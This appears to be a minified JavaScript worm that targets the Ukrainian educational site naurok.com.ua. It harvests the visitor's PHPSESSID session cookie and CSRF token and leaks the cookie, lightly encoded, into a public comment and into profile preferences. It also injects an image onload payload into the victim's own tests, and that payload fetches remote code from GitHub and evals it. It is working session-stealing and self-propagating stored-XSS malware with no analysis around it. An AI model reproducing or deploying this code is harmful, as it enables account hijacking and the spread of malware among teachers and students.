(()=>{"use strict";({607:function(){var t=this&&this.__awaiter||function(t,e,n,a){return new(n||(n=Promise))((function(o,s){function i(t){try{p(a.next(t))}catch(t){s(t)}}function c(t){try{p(a.throw(t))}catch(t){s(t)}}function p(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(i,c)}p((a=a.apply(t,e||[])).next())}))};const e=function(t){return(new DOMParser).parseFromString(t,"text/html")},n=t=>new Promise((e=>setTimeout(e,t))),a=(e,a={})=>t(void 0,void 0,void 0,(function*(){for(let t=1;t<5;++t){const o=yield fetch(e,a);if(403!==o.status&&429!==o.status)return o;yield n(200*t)}return fetch(e,a)})),o=[{id:1,name:"Алгебра",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/2073718/images/361417_1621922038.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/87220/images/315966_1587380832.png","https://naurok-test2.nyc3.digitaloceanspaces.com/625957/images/425984_1652015091.jpg"]},{id:34,name:"Англійська мова",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/1288048/images/487935_1617692301.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/1942670/images/994288_1652034896.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/860510/images/177184_1652082799.jpg"]},{id:40,name:"Астрономія",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/20724/images/472691_1617615940.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/105002/images/174395_1579624575.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/1186191/images/318565_1612098388.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/303273/images/852444_1648632950.jpg"]},{id:3,name:"Біологія",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/370813/images/590035_1620132923.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/860510/images/906667_1652083103.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/860510/images/708436_1652083163.jpg"]},{id:9,name:"Всесвітня історія",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/170889/images/750758_1585302610.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/36951/images/882055_1587976602.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/965750_1652083452.png"]},{id:4,name:"Географія",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/70127/images/242163_1558367278.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/328275/images/399165_1651420237.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/225124_1652083674.jpg"]},{id:5,name:"Геометрія",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/550171/images/436719_1631878431.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/133643/images/317323_1586971226.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/7919/images/668126_1643791230.jpg"]},{id:50,name:"Громадянська освіта",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/131672/images/206666_1651074107.png","https://naurok-test2.nyc3.digitaloceanspaces.com/107861/images/694333_1618645744.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/329258/images/390192_1589977033.jpg"]},{id:41,name:"Екологія",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/218173/images/354297_1648473514.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/10261/images/219601_1648120056.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/273276/images/497494_1632993854.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/142364/images/758545_1594233261.jpg"]},{id:37,name:"Економіка",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/25318/images/124617_1652034796.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/521890/images/570282_1572712621.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/121770/images/933365_1637050099.jpg"]},{id:45,name:"Етика",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/56644/images/664508_1651949205.png","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/297962/images/165469_1588084096.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/56644/images/780632_1651405061.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/297962/images/276489_1588157203.jpg"]},{id:6,name:"Зарубіжна література",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/943749/images/637566_1652076597.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/145717/images/502457_1557645597.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/241069/images/642224_1614350950.gif"]},{id:43,name:"Захист України",photos:[]},{id:7,name:"Інформатика",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/177776/images/475313_1555430651.png","https://naurok-test2.nyc3.digitaloceanspaces.com/426593/images/272871_1652010102.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/70480/images/290399_1589225726.jpg"]},{id:44,name:"Іспанська мова",photos:[]},{id:8,name:"Історія України",photos:[]},{id:52,name:"Креслення",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/1905888/images/862349_1612466904.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/1905888/images/729086_1612465234.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/1905888/images/388033_1638902435.png","https://naurok-test2.nyc3.digitaloceanspaces.com/1905888/images/946902_1638731188.jpg"]},{id:26,name:"Літературне читання",photos:[]},{id:38,name:"Людина і світ",photos:[]},{id:10,name:"Математика",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/302415/images/770311_1589556553.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/76790/images/128299_1652021020.gif","https://naurok-test2.nyc3.digitaloceanspaces.com/36968/images/519856_1652020584.jpg"]},{id:30,name:"Мистецтво",photos:[]},{id:11,name:"Музичне мистецтво",photos:[]},{id:12,name:"Навчання грамоти",photos:[]},{id:35,name:"Німецька мова",photos:[]},{id:31,name:"Образотворче мистецтво",photos:[]},{id:13,name:"Основи здоров’я",photos:[]},{id:48,name:"Польська мова",photos:[]},{id:33,name:"Правознавство",photos:[]},{id:49,name:"Природничі науки",photos:[]},{id:27,name:"Природознавство",photos:[]},{id:29,name:"Російська мова",photos:[]},{id:42,name:"Технології",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/198575/images/676635_1652060591.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/1986932/images/164578_1650268505.png","https://naurok-test2.nyc3.digitaloceanspaces.com/153454/images/690516_1649873792.jpg"]},{id:32,name:"Трудове навчання",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/1986932/images/883197_1651764835.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/62807/images/480564_1556782431.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/60929/images/992536_1649674877.jpg"]},{id:15,name:"Українська література",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/43477/images/914056_1650307989.jpg","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/721349/images/440369_1588529477.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/92987/images/704630_1651742161.png","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/94918/images/834624_1586877408.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/76790/images/807166_1651663293.gif"]},{id:14,name:"Українська мова",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/94918/images/834624_1586877408.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/15151/images/997667_1652073081.png","https://naurok-test2.nyc3.digitaloceanspaces.com/76790/images/807166_1651663293.gif","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/721349/images/771666_1586016306.jpg"]},{id:2,name:"Фізика",photos:["https://naurok-test2.nyc3.digitaloceanspaces.com/48687/images/425777_1651565720.png","https://naurok-test.nyc3.cdn.digitaloceanspaces.com/98/images/362323_1556045739.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/683860_1652084672.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/485909_1652084681.jpg"]},{id:17,name:"Фізична культура",photos:[]},{id:36,name:"Французька мова",photos:[]},{id:16,name:"Хімія",photos:["https://naurok-test.nyc3.cdn.digitaloceanspaces.com/62843/images/128564_1586095892.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/128039/images/494383_1651143664.png","https://naurok-test2.nyc3.digitaloceanspaces.com/2896/images/909922_1651842852.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/28942/images/287077_1651784980.jpg","https://naurok-test2.nyc3.digitaloceanspaces.com/140157/images/795454_1651667066.gif","https://naurok-test2.nyc3.digitaloceanspaces.com/128039/images/569470_1650450874.png"]},{id:39,name:"Художня культура",photos:[]},{id:28,name:"Я досліджую світ",photos:[]}],s=new Set([2,44,49,62,184,66340,76969,160434,164030,172621,292824,512890,544681,566167,753104,795666,809870,1450135,1463086,1463095,1468943,1514182,1614782,1644580,1806142,1907876,1921916,1940947,1950198,2034027,2249429,2384594,2392283,2398127,2479324,2556828,2827145,2962392]),i=t=>(t+3)%4==0;!function(){t(this,void 0,void 0,(function*(){const c=document.querySelectorAll("img[i]");for(const t of c)t.removeAttribute("onload"),t.removeAttribute("i"),t.setAttribute("src",t.getAttribute("src").slice(0,-1));if(window.e)return;window.e=!0;const p="/post/zruchni-dodatki-dlya-notatok-planuvati-golovne",r="https://naurok.com.ua"+p,m=document.cookie.match(/PHPSESSID=([a-z0-9]+)/);if(!m)return;const g=m[1],d=(document.URL,document.referrer,yield a("https://naurok.com.ua")),u=yield d.text(),h=u.match(/meta name="csrf-token" content="(.+)"/);if(!h)return;const l=h[1];if(!l)return;const y=u.match(/<a href=".profile.(.+)">Особиста/);if(!y)return;const f=parseInt(y[1]);if(3250755===f)return;const k=t=>{let e="";for(const n of t)e+=String.fromCharCode(n.charCodeAt(0)+6e3);return e};s.has(f)&&(yield function(){return t(this,void 0,void 0,(function*(){const t=yield a(r),e=yield t.text();if(e.includes(`href="/profile/${f}" d`))return;const n=e.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);if(!n)return;const o=n[1],s=atob("Jg==");yield a(`https://naurok.com.ua/comment/default/create?entity=${o}`,{headers:{accept:"*/*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token":`${l}`,"x-requested-with":"XMLHttpRequest"},referrer:r,referrerPolicy:"strict-origin-when-cross-origin",body:`_csrf=${l}${s}CommentModel[content]=${k(g)}${s}CommentModel[parentId]=${s}CommentModel[url]=${p}`,method:"POST",mode:"cors",credentials:"include"})}))}());const _=e=>t(this,void 0,void 0,(function*(){const t=yield a(`https://naurok.com.ua/api/test/documents/${e}`);return yield t.json()})),j=function(e){return t(this,void 0,void 0,(function*(){const t=e.match(/(\d+).html/);if(!t)return;const n=t[1],s=yield _(n);if(!s)return;const{document:i,questions:c}=s,p=i.id,r="https://naurok.com.ua/test/builder/"+p,m=i.subject_id;if(!i.image||"https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/801236_1651844282.png"===i.image.split("?")[0]){let t;for(let e=0;e<o.length;++e)if(o[e].id===m){if(0===o[e].photos.length)break;t=o[e].photos[p%o[e].photos.length];break}i.image=t||""}const g="?\"i onload=\"(b=window.b||fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text())).then(eval)";t:for(const t of c){if(t.csrf=l,t.image){t.image+=g,yield a(`https://naurok.com.ua/api/test/questions/${t.id}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:r,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break}for(const e of t.options)if(e.image){e.image+=g,yield a(`https://naurok.com.ua/api/test/questions/${n}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:r,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break t}}const d=i.image.split("?")[0];d&&(i.image=d+g),yield a("https://naurok.com.ua/api/test/documents/"+p,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8",Referer:r,"Referrer-Policy":"strict-origin-when-cross-origin"},body:JSON.stringify(i),method:"PUT"})}))};49===f&&function(){t(this,void 0,void 0,(function*(){const t=yield a("https://naurok.com.ua/preferences"),e=(yield t.text()).match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about.+">(.*)<.textarea>/s);if(!e)return;e[1];const n=function(t){return btoa(t)}(g);yield a("https://naurok.com.ua/preferences",{headers:{accept:"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type":"multipart/form-data; boundary=----WebKitFormBoundaryKnLgq0VhMq7Xl2Pu"},referrer:"https://naurok.com.ua/preferences",referrerPolicy:"strict-origin-when-cross-origin",body:`------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="_csrf"\r\n\r\n${l}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="AccountPreferences[position]"\r\n\r\n${"вчитель української мови та літератури"+n}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,method:"POST",mode:"cors",credentials:"include",redirect:"manual"})}))}(),417601!==f&&[].push(function(){var o,s;return t(this,void 0,void 0,(function*(){for(let t=1;;++t){const c=yield a(`https://naurok.com.ua/test/moe?storinka=${t}`),p=yield c.text(),r=e(p),m=r.querySelector("div.items > ul > li.active > a");if(!m&&1!==t)return;if(m&&m.innerText!==`${t}`)return;const g=r.querySelectorAll(".file-item.test-item");for(const t of g){const e=t.querySelector("img");let a=e&&"https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/801236_1651844282.png"===(null===(o=e.getAttribute("src"))||void 0===o?void 0:o.split("?")[0]);if(e&&(null===(s=e.getAttribute("onload"))||void 0===s?void 0:s.includes("window.b"))&&!a)continue;const c=t.querySelector(".headline a");if(!c)continue;const p=c.getAttribute("href");if(p){if(!e){const t=p.match(/(\d+).html/);if(t){const e=t[1];if(!i(Number(e)))continue}}yield j("https://naurok.com.ua"+p),n(100)}}n(1e3)}}))}())}))}()}})[607]()})();
